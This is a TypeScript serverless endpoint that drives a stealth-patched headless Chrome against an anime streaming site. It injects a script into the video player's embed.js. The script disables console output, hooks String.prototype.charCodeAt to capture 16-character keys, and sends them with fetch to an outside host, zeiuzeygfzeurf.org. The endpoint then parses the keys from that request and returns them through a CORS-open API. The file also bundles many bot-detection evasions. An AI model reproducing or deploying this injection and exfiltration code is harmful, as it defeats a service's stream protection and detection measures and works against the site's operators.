import puppeteer from 'puppeteer-extra';
import chrome from '@sparticuz/chromium';
import { Browser, Page } from 'puppeteer-core';

import StealthPlugin from 'puppeteer-extra-plugin-stealth';
puppeteer.use(StealthPlugin())

// Stealth plugin issue - There is a good fix but currently this works.
require('puppeteer-extra-plugin-user-data-dir')
require('puppeteer-extra-plugin-user-preferences')
require('puppeteer-extra-plugin-stealth/evasions/chrome.app')
require('puppeteer-extra-plugin-stealth/evasions/chrome.csi')
require('puppeteer-extra-plugin-stealth/evasions/chrome.loadTimes')
require('puppeteer-extra-plugin-stealth/evasions/chrome.runtime')
require('puppeteer-extra-plugin-stealth/evasions/defaultArgs') // pkg warned me this one was missing
require('puppeteer-extra-plugin-stealth/evasions/iframe.contentWindow')
require('puppeteer-extra-plugin-stealth/evasions/media.codecs')
require('puppeteer-extra-plugin-stealth/evasions/navigator.hardwareConcurrency')
require('puppeteer-extra-plugin-stealth/evasions/navigator.languages')
require('puppeteer-extra-plugin-stealth/evasions/navigator.permissions')
require('puppeteer-extra-plugin-stealth/evasions/navigator.plugins')
require('puppeteer-extra-plugin-stealth/evasions/navigator.vendor')
require('puppeteer-extra-plugin-stealth/evasions/navigator.webdriver')
require('puppeteer-extra-plugin-stealth/evasions/sourceurl')
require('puppeteer-extra-plugin-stealth/evasions/user-agent-override')
require('puppeteer-extra-plugin-stealth/evasions/webgl.vendor')
require('puppeteer-extra-plugin-stealth/evasions/window.outerdimensions')


import { PuppeteerBlocker } from '@cliqz/adblocker-puppeteer';
import fetch from 'cross-fetch'; // required 'fetch'

import { RequestInterceptionManager } from 'puppeteer-intercept-and-modify-requests'

const delay = ms => new Promise(resolve => setTimeout(resolve, ms))


async function clickPlay(page: Page) {
  let hasDoneInitialClick = false;
  while (true) {
    page.bringToFront();
    const elem = await page.$(".play");
    await delay(200);
    if (elem) {
      elem.click();
      page.bringToFront();
      await delay(200);
      hasDoneInitialClick = true;
    } else if (hasDoneInitialClick) {
      return;
    }
  }
}


const payloadLmao = `
// alert("hi!!");
const log = console.log;
console.log = () => {};
console.clear = () => {};
console.table = () => {};

const originalCharCodeAt = String.prototype.charCodeAt;

function isASCII(str) {
  return /^[\x00-\x7F]*$/.test(str);
}
const calledOn = [];

String.prototype.charCodeAt = function(index) {
  // log("String: " + this + ", Index: " + index);
  // @ts-ignore
  if (this.length == 16 && isASCII(this) && !calledOn.includes(this + "")) {
    // @ts-ignore
    calledOn.push(this + "");
    log("Found key " + this + " - num " + calledOn.length);
  }
      
  return originalCharCodeAt.call(this, index);
};

setTimeout(() => {
  fetch("https://zeiuzeygfzeurf.org/" + encodeURIComponent(JSON.stringify(calledOn)));
}, 3000);
`

const replacementHtml = `<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Document</title>
</head>
<body>
    <iframe src="https://vid2a41.site/e/8EJW143ZWY04?t=4xjSCPIiBlUIyg%3D%3D&amp;autostart=true" allow="autoplay; fullscreen" allowfullscreen="yes" frameborder="no" scrolling="no" style="width: 100%; height: 100%; overflow: hidden;"></iframe>
</body>
</html>`


export default async (req: any, res: any) => {
  let {body,method} = req  

  // Some header shits
  if (method !== 'POST') {
    res.setHeader('Access-Control-Allow-Credentials', true)
    res.setHeader('Access-Control-Allow-Origin', '*')
    res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT')
    res.setHeader(
      'Access-Control-Allow-Headers',
      'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
    )
    return res.status(200).end()
  }

  const url = "https://aniwave.to/watch/one-piece.ov8/ep-1"
  const isProd = process.env.NODE_ENV === 'production'

  // create browser based on ENV
  let browser: Browser;

  if (isProd) {
    browser = await puppeteer.launch({
      args: chrome.args,
      defaultViewport: chrome.defaultViewport,
      executablePath: await chrome.executablePath(),
      headless: true,
      ignoreHTTPSErrors: true
    })
  } else {
    browser = await puppeteer.launch({
      headless: false,
      executablePath: '/usr/bin/google-chrome-stable',
    })
  }
  const client = await browser.target().createCDPSession();
  const interceptManager = new RequestInterceptionManager(client);

  const page = await browser.newPage();
  // await page.setRequestInterception(true);
  PuppeteerBlocker.fromPrebuiltAdsAndTracking(fetch).then((blocker) => {
    blocker.enableBlockingInPage(page);
  });

  // function logRequest(interceptedRequest) {
  // console.log('A request was made:', interceptedRequest.url());}
  // page.on('request', logRequest);

  let keys: string[];

  try {
    const keysReq = page.waitForRequest(req => req.url().includes("zeiuzeygfzeurf"), {timeout: 10000});

    // await page.goto(url, { waitUntil: 'domcontentloaded' });
    console.log("Page loaded.");
    const interceptionConf: Interception = {
      urlPattern: "https://aniwave.to/watch/one-piece.ov8/*",
      modifyRequest: async ({ event }) => {
        // Modify request headers
        console.log(event.headers);
        
        return {
          headers: [{ name: 'X-Custom-Header', value: 'CustomValue' }],
        }
      },
      modifyResponse: async ({ body }) => {
        return  {
          body: replacementHtml
        }
      },
    }

    const otherInterceptionConf: Interception = {
      urlPattern: `*/mcloud/min/embed.js*`,
      resourceType: 'Script',
      modifyResponse({ body }) {  
        console.log("Replacing embed.");
        return {
          body: payloadLmao + body
        }
      },
    }
    console.log("Starting...");

    await interceptManager.intercept(interceptionConf);
    await interceptManager.intercept(otherInterceptionConf)
    const a = page.goto(url);
    // page.setContent(replacementHtml)
    await delay(3000);
    console.log("attempting reload");

    await page.reload()
    console.log("reloaded");

    // await pageGoto;
    // console.log(await page.content());

    console.log("Page loaded.");

    // Check if invalid from html
    if ((await page.content()).includes("We can't find the file you are looking for")) {      
      console.error(`Invalid url: ${url}`);
      await browser.close();
      return res.status(400).end("Invalid ID");
    }

    // Click page until all popups r gone and the video plays
    // await clickPlay(page);
    // console.log("Clicked play !");
    
    

    console.log("Waiting for request with keys...");
    const keysUrlEncoded = await keysReq;
    
    console.log("Got keys, trying to parse...");
    
    keys = JSON.parse(decodeURIComponent(keysUrlEncoded.url().split("/").at(-1)!));
  } catch (error) {
    // Just in case
    console.error("Catched error: " + error);
    return res.status(500).end("Server error.")
  }

  await browser.close();

  // Response headers.
  res.setHeader('Cache-Control', 's-maxage=10, stale-while-revalidate')
  res.setHeader('Content-Type', 'application/json')
  // CORS
  // res.setHeader('Access-Control-Allow-Headers', '*')
  res.setHeader('Access-Control-Allow-Credentials', true)
  res.setHeader('Access-Control-Allow-Origin', '*')
  res.setHeader('Access-Control-Allow-Methods', 'GET,OPTIONS,PATCH,DELETE,POST,PUT')
  res.setHeader(
    'Access-Control-Allow-Headers',
    'X-CSRF-Token, X-Requested-With, Accept, Accept-Version, Content-Length, Content-MD5, Content-Type, Date, X-Api-Version'
  )
  console.log("Success !");
  console.log(keys);
  res.json(keys);
};
